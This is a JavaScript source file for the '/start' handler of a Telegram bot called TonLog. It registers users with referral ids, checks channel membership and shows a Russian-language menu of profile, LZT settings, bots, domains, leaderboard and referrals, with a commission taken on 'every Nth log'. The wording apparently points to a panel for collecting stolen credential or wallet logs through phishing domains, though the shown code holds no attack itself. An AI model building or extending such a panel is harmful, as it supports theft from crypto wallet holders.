import { bot } from "../../index.js";
import config from '../../../../config.json' assert { type: 'json' };
import Database from "../../../database/index.js";
import User from "../../../database/schemas/user.js";
import commission from "../../../database/schemas/commission.js";
import checker from "../../../checker/index.js";

export default {
    name: "/start",
    async exec(message) {
        const user = await Database.getUser(message.from.id);
        if (!user) {
            await Database.createUser(message.from.id, !isNaN(+message.text.split(" ")[1]) ? message.text.split(" ")[1] : null, message.from.username ? `@${message.from.username}` : message.from.first_name);
        }

        if (!user?.member) {
            const { status } = await bot.getChatMember(isNaN(+config.channel) ? (await bot.getChat(`@${config.channel}`)).id : config.channel, message.from.id)
                .catch(() => ({ status: 'error' }));

            if (status === 'left') {
                await bot.deleteMessage(message.chat.id, message.message_id);
                const msg = await bot.sendPhoto(message.from.id, 'cdn/hi.png', {
                    caption: `👋🏻 Привет! Добро пожаловать в TonLog!

💎 Для работы с панелью вступи в наш чат! 👇🏻`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "➕ Вступить",
                                    url: config.chat
                                }
                            ]
                        ]
                    }
                });
                return checker(message.from.id, msg.message_id);
            } else await User.updateOne({ id: message.from.id }, { $set: { member: true } });
        }

        await bot.sendMessage(message.from.id, `💎 Вам было выведено меню`, {
            reply_markup: {
                resize_keyboard: true,
                keyboard: [
                    [
                        {
                            text: '🏠 Меню'
                        }
                    ]
                ]
            }
        })

        await bot.sendPhoto(message.from.id, 'cdn/menu.png', {
            caption: `<b>⚡️ Добро пожаловать в <a href="https://t.me/tonlog">TonLog</a>!</b>

<b>🧾 Комиссия:</b> Каждый ${user?.com || (await commission.findOne({})).value} лог`,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '💻 Профиль',
                            callback_data: 'profile'
                        },
                        {
                            text: '⚙️ Настройки LZT',
                            callback_data: 'lzt'
                        }
                    ],
                    [
                        {
                            text: "🤖 Боты",
                            callback_data: 'bots'
                        },
                        {
                            text: '🌐 Домены',
                            callback_data: `domains`
                        }
                    ],
                    [
                        {
                            text: '🏆 Топ Проекта',
                            callback_data: 'top:all'
                        },
                        {
                            text: '📃 Информация',
                            callback_data: 'info'
                        }
                    ],
                    [
                        {
                            text: '👥 Реферальная система',
                            callback_data: 'templates'
                        }
                    ]
                ]
            }
        })
    }
}